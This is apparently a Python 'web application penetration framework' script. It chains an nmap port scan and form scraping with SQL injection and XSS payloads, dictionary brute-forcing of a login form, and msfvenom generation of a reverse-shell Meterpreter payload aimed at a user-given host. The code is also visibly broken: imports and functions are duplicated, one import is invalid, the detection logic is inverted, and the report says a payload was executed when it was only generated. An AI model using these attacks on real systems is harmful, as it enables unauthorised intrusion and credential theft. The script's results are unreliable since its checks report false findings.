######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner. Note: Be mindful of the scope of work, & rules of engagement, script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. .
# python web_security_framework.py.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
######################################################################################################################################################################################################################

import requests
from bs4 import BeautifulSoup
import urllib.parse
import base64
import random
import string
import csv
import time

# Banner
def print_banner():
    banner = r"""

 __      __        ___.             _____                  .__   .__                  __  .__                       _________                           .__   __                ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
/  \    /  \  ____ \_ |__          /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /_/ __ \ | __ \        /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        / \  ___/ | \_\ \      /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  /   \___  >|___  /______\____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
       \/        \/     \//_____/        \/|__|    |__|                   \/      \/                     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)


  Web Application Security Framework - Custom Pen Testing Script
    """
    print(banner)

import os
import requests
import nmap
import time
from bs4 import BeautifulSoup
from subprocess import Popen, PIPE

def install_dependencies():
    """Install necessary dependencies if missing."""
    print("[*] Checking dependencies...")
    try:
        import requests
        import nmap
        import beautifulsoup4
        print("[*] All dependencies are met!")
    except ImportError:
        print("[*] Installing missing dependencies...")
        os.system("pip install requests nmap beautifulsoup4")

def print_banner():
    """Displays a welcome banner"""
    print("===================================================")
    print("       Web Application Penetration Framework       ")
    print("===================================================")

def nmap_scan(target):
    """Runs an Nmap scan on the target and returns the result."""
    print("[*] Running Nmap scan on target: " + target)
    nm = nmap.PortScanner()
    nm.scan(target, '1-1024')  # Scanning ports 1-1024
    return nm

def form_extraction(url):
    """Extract forms and hidden fields from the target page."""
    print("[*] Extracting forms from " + url)
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    form_data = []
    for form in forms:
        action = form.get('action')
        method = form.get('method')
        hidden_fields = {input.get('name'): input.get('value') for input in form.find_all('input', type='hidden')}
        form_data.append({'action': action, 'method': method, 'hidden_fields': hidden_fields})
    return form_data

def sql_injection_test(url):
    """Test for basic SQL Injection vulnerability."""
    print("[*] Testing for SQL Injection vulnerability...")
    payload = "' OR 1=1 --"
    response = requests.get(url + payload)
    if "error" in response.text or "syntax" in response.text:
        print("[*] SQL Injection test failed")
    else:
        print("[*] SQL Injection vulnerability detected!")
        return True
    return False

def xss_test(url):
    """Test for Cross-Site Scripting (XSS) vulnerabilities."""
    print("[*] Testing for XSS vulnerability...")
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url + payload)
    if payload in response.text:
        print("[*] XSS vulnerability detected!")
        return True
    else:
        print("[*] XSS test failed")
    return False

def bruteforce_login(url, form_data, dictionary_path):
    """Bruteforce login form using a dictionary of usernames and passwords."""
    print("[*] Bruteforce login attempt using dictionary...")
    usernames = open(dictionary_path, 'r').readlines()
    passwords = open(dictionary_path, 'r').readlines()
    
    for username in usernames:
        for password in passwords:
            username = username.strip()
            password = password.strip()
            data = {
                'username': username,
                'password': password
            }
            response = requests.post(url, data=data)
            if "Login successful" in response.text:
                print(f"[*] Found credentials: {username}:{password}")
                return username, password
    return None, None

def run_metasploit(payload, lhost, lport):
    """Run Metasploit to handle exploitation."""
    print("[*] Running Metasploit to exploit the vulnerability...")
    metasploit_command = f"msfvenom -p {payload} Lhost={lhost} Lport={lport} -f raw"
    metasploit = Popen(metasploit_command, shell=True, stdout=PIPE, stderr=PIPE)
    metasploit_output, metasploit_error = metasploit.communicate()
    print("[*] Metasploit payload created: ")
    print(metasploit_output)

    return metasploit_output

def generate_report(target, vulnerabilities):
    """Generate a detailed report of the findings."""
    print("[*] Generating detailed report...")
    with open(f"report_{target}.html", "w") as report:
        report.write("<html><body>")
        report.write(f"<h1>Penetration Test Report for {target}</h1>")
        report.write("<h2>Vulnerabilities Detected:</h2><ul>")
        for vuln in vulnerabilities:
            report.write(f"<li>{vuln}</li>")
        report.write("</ul></body></html>")

def main():
    """Main function to run the entire framework."""
    install_dependencies()
    print_banner()
    
    # User input for target
    target = input("Enter the Target URL (e.g., http://192.168.1.10): ").strip()
    
    # Reconnaissance (Nmap scan)
    nmap_results = nmap_scan(target)
    print("[*] Nmap scan results: ", nmap_results.all_hosts())
    
    # Form extraction and attacks
    print("[*] Performing form extraction...")
    form_data = form_extraction(target)
    print("[*] Forms found: ", form_data)

    # Security testing
    vulnerabilities = []
    
    # Test for SQL Injection
    if sql_injection_test(target):
        vulnerabilities.append("SQL Injection")
    
    # Test for XSS
    if xss_test(target):
        vulnerabilities.append("XSS")

    # Brute force login
    login_url = input("Enter the login URL (if applicable): ")
    dictionary_path = input("Enter the path to the dictionary file for brute force: ")
    username, password = bruteforce_login(login_url, form_data, dictionary_path)
    if username and password:
        vulnerabilities.append(f"Brute Force login successful: {username}:{password}")

    # Metasploit integration
    payload = input("Enter the Metasploit payload (e.g., php/meterpreter/reverse_tcp): ")
    lhost = input("Enter the local host IP: ")
    lport = input("Enter the local port: ")
    metasploit_output = run_metasploit(payload, lhost, lport)
    vulnerabilities.append(f"Metasploit Payload executed: {metasploit_output}")
    
    # Report generation
    generate_report(target, vulnerabilities)
    print("[*] Report generated successfully!")

if __name__ == "__main__":
    main()
